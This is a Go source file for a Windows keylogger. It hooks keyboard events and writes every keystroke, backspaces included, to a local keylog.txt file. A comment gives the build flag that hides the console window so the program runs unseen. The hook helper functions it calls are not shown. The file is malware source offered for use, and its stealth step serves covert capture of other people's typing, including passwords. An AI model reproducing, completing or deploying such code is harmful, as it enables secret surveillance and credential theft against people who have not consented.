package main

import (
	"os"
	"syscall"
	"fmt"
)

type Message struct {
	HWnd    syscall.Handle
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      struct{ X, Y int32 }
}

// Variable used to hold the last pressed character (to ensure that double pressing DN occur)
var savingPath string = "./keylog.txt"
var contentBuffer string = ""

// IMPORTANT NOTE: To hide CMD popup, you must use "go build -ldflags -H=windowsgui -o keylog.exe ./src" command

func main() {
	// Attaching keyboard event hook
	SetHook(customCallbackOnKeypress)
	
	// Setting up variables for looped keyboard event checking
	var msg = MessageSetup()

	go func() {
		// Reading the previous contents of the .keyclicks file so that it can be saved --> DN check for errors
		prevContent, _ := os.ReadFile(savingPath)
		contentBuffer += string(prevContent)
		
		// Recreating file w/ previous data
		os.WriteFile(savingPath, []byte(contentBuffer), 0644)

		// Continuous loop that checks for keyboard events
		MessageLoop(msg)
		
		// Ensuring that keyboard hook is removed to free up used memory
		Unhook()

	}() 
	select {}
}

func customCallbackOnKeypress(pressedKeyInArray []uint32) {
	//////////////////////////////////////////////////////////////////////////////////////////////////
	// This function is run everytime a key event occurs >>> This can be a KEY_DOWN or a KEY_UP event.
	//////////////////////////////////////////////////////////////////////////////////////////////////
	var pressedKey rune = rune(pressedKeyInArray[0])

	// Only printing the value if it is not NULL or a backspace or a delete char
	if pressedKey != 0 && pressedKey != 8 {
		contentBuffer += fmt.Sprintf("%c", pressedKey)
	} else if pressedKey == 8 { // Checking if Backspace key was pressed
		if len(contentBuffer) != 0 { // Ensuring that you don't backspace on any empty file
			contentBuffer = contentBuffer[:len(contentBuffer)-1]
    	}
	}

	// NOTE: As this tracker just tracks keystrokes, it will always append to the end of the .txt. This means that the DEL key is useless...

	// // Write content to the file
	os.WriteFile(savingPath, []byte(contentBuffer), 0644)
}
